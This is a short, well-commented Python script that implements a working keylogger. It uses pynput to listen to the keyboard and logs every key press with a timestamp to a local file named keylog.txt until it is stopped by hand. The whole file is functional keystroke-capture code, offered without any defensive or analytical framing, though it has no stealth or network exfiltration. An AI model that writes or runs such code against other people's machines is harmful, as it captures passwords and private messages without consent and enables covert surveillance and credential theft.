from pynput import keyboard
import logging
import os

def setup_logging(log_file):
    """
    Sets up logging to the specified file. Initializes the log file with a message if it does not exist.
    
    Args:
        log_file (str): The path to the log file. If the file does not exist, it is created.
    
    Returns:
        None
    
    This function ensures that the log file is created with an initial message if it is not already present. 
    It then configures the logging module to write log messages to this file, with the logging level set to DEBUG.
    """
    if not os.path.exists(log_file):
        with open(log_file, 'w') as f:
            f.write("Keylogger started...\n")

    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    """
    Callback function that is triggered every time a key is pressed.
    
    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was pressed. It could be a special key (e.g., shift, ctrl) 
        or a regular character key.
    
    Returns:
        None
    
    This function logs the key press to the log file. If an error occurs during logging, it prints the error message to the console.
    """
    try:
        # Log the key press as a string.
        logging.info(f"Key pressed: {key}")
    except Exception as e:
        # Print any errors that occur during logging.
        print(f"Error: {e}")

def on_release(key):
    """
    Callback function that is triggered every time a key is released.
    
    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was released. This is used to monitor key releases,
        but no action is taken in this implementation.
    
    Returns:
        None
    
    This function does not perform any actions upon key release.
    """
    pass  # We don't need to log key releases.

def main():
    """
    Main function to set up and run the keylogger.
    
    This function initializes the logging setup and starts a keyboard listener that monitors key presses and releases.
    The listener runs indefinitely until manually stopped.
    
    Returns:
        None
    """
    log_file = "keylog.txt"
    setup_logging(log_file)
    
    # Create a keyboard listener that monitors key presses and releases.
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
